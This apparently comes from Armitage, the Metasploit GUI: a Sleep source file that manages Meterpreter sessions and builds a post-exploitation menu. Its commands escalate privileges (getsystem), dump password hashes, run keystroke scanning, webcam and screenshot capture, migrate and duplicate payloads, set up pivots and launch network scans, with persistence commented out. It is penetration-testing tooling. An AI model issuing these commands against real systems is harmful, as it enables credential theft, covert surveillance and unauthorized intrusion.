
#
# this code maintains the client threads (one per meterpreter session) and
# the data structures for each meterpreter session.
#

import armitage.*;
import console.*;

import javax.swing.*;

global('%sessions %handlers $handler');

sub session {
	if ($1 !in %sessions) {
		%sessions[$1] = [new ConsoleClient: $null, $client, "session.meterpreter_read", "session.meterpreter_write", "session.stop", "$1", $null];
		[%sessions[$1] addSessionListener: lambda(&parseMeterpreter)];		
	}

	return %sessions[$1];
}

sub oneTimeShow {
	%handlers[$1] = lambda({
		if ($0 eq "begin") {
			showError($2);
			%handlers[$command] = $null;
		}
	}, $command => $1);
}

# m_cmd("session", "command here")
sub m_cmd {
	local('$command');
	$command = split('\s+', [$2 trim])[0];

	$handler = %handlers[$command];
	if ($handler !is $null) {
		[$handler execute: $1, [$2 trim]];
	}

	[session($1) sendString: "$2 $+ \n"];
}

sub parseMeterpreter {
	local('@temp $command $line');

	if ($0 eq "sessionRead" && $handler !is $null) {
		local('$h');
		$h = $handler;

		[$h begin: $1, $2];
		@temp = split("\n", $2);
		foreach $line (@temp) {
			[$h update: $1, $line];
		}	
		[$h end: $1, $2];
	}
}

#
# this code creates and managers a meterpreter tab.
#
sub createMeterpreterTab {
        local('$session $result $thread $console $old');

        $session = session($1);
	$old = [$session getWindow];
	if ($old !is $null) {
		[$frame removeTab: $old];
	}

        $console = [new Console: $preferences];
        [$session setWindow: $console];

	[$console setPopupMenu: lambda(&meterpreterPopup, $session => sessionData($1), $sid => $1)];

        [$frame addTab: "Meterpreter $1", $console, $null];
}

sub meterpreterPopup {
        local('$popup');
        $popup = [new JPopupMenu];

	showMeterpreterMenu($popup, \$session, \$sid);
	
        [$popup show: [$2 getSource], [$2 getX], [$2 getY]];
}

sub showMeterpreterMenu {
	local('$j $platform');
	
	$platform = lc($session['platform']);

	if ("*win*" iswm $platform) {
		$j = menu($1, "Access", 'A');
	
		item($j, "Duplicate", 'D', lambda({
			meterpreterPayload("meterpreter-upload.exe", lambda({
				if ($1 eq "generate -t exe -f meterpreter-upload.exe\n") {
					m_cmd($sid, "run uploadexec -e meterpreter-upload.exe");
				}
			}, \$sid));
		}, $sid => "$sid"));

		item($j, "Migrate Now!", 'M', lambda({
			oneTimeShow("run");
			m_cmd($sid, "run migrate -f");
		}, $sid => "$sid"));

		item($j, "Escalate Privileges", 'E', lambda({
			%handlers["getsystem"] = {
				this('$safe');

				if ($0 eq "begin" && "*Unknown command*getsystem*" iswm $2) {
					if ($safe is $null) {
						$safe = 1;
						m_cmd($1, "use priv");
						m_cmd($1, "getsystem -t 0");
					}
					else {
						$safe = $null;
						showError("getsystem is not available here");
					}
				}
				else if ($0 eq "begin") {
					showError($2);
				}
				else if ($0 eq "end") {
					%handlers["getsystem"] = $null;
					$handler = $null;
				}
			};

			m_cmd($sid, "getsystem -t 0");
		}, $sid => "$sid"));

		item($j, "Dump Hashes", "D", lambda({ 
			m_cmd($sid, "hashdump");
		}, $sid => "$sid"));

		#item($j, "Run Persistence", 'R', lambda({
		#	oneTimeShow("run");
		#	m_cmd($sid, "run persistence");
		#}, $sid => "$sid"));
	}
			
	$j = menu($1, "Interact", 'I');

			if ("*win*" iswm $platform) {
				item($j, "Command Shell", 'C', lambda({ createShellTab($sid); }, $sid => "$sid"));
			}

			item($j, "Meterpreter Shell", 'M', lambda({ createMeterpreterTab($sid); }, $sid => "$sid"));

			if ("*win*" iswm $platform) {
				item($j, "Run VNC", 'V', lambda({ m_cmd($sid, "run vnc -t -i"); }, $sid => "$sid"));
			}

	$j = menu($1, "Explore", 'E');
			item($j, "Browse Files", 'B', lambda({ createFileBrowser($sid); }, $sid => "$sid"));
			item($j, "Show Processes", 'P', lambda({ createProcessBrowser($sid); }, $sid => "$sid"));
			if ("*win*" iswm $platform) {
				item($j, "Key Scan", 'K', lambda({ createKeyscanViewer($sid); }, $sid => "$sid"));
			}
			item($j, "Screenshot", 'S', createScreenshotViewer("$sid"));
			item($j, "Webcam Shot", 'W', createWebcamViewer("$sid"));

	$j = menu($1, "Pivoting", 'P');
			item($j, "Setup...", 'A', setupPivotDialog("$sid"));
			item($j, "Remove", 'R', lambda({ killPivots($sid, $session); }, \$session, $sid => "$sid"));


	enumerateMenu($1, sessionToHost($session)); 

	separator($1);

	item($1, "Kill", 'K', lambda({ cmd($client, $console, "sessions -k $sid", {}); }, $sid => "$sid"));
}

sub enumerateMenu {
	local('$2');

	item($1, "MSF Scans", 'S', lambda({
		local('$hosts @modules');

		@modules = filter({ return iff("*_version" iswm $1, $1); }, @auxiliary);
		push(@modules, "scanner/discovery/udp_sweep");
		push(@modules, "scanner/netbios/nbname");
		push(@modules, "scanner/dcerpc/tcp_dcerpc_auditor");
		push(@modules, "scanner/mssql/mssql_ping");

		$hosts = ask("Enter range (e.g., 192.168.1.0/24):");

		thread(lambda({
			local('%options $scanner $count $pivot');

			if ($hosts !is $null) {
				# we don't need to set CHOST as the discovery modules will honor any pivots already in place
				%options = %(THREADS => iff(isWindows(), 2, 8), RHOSTS => $hosts);

				foreach $scanner (@modules) {
					call($client, "module.execute", "auxiliary", $scanner, %options);
					$count++;
					yield 250;
				}

				showError("Launched $count discovery modules");
			}
		}, \$hosts, \@modules));
	}, $pivot => $2));
}
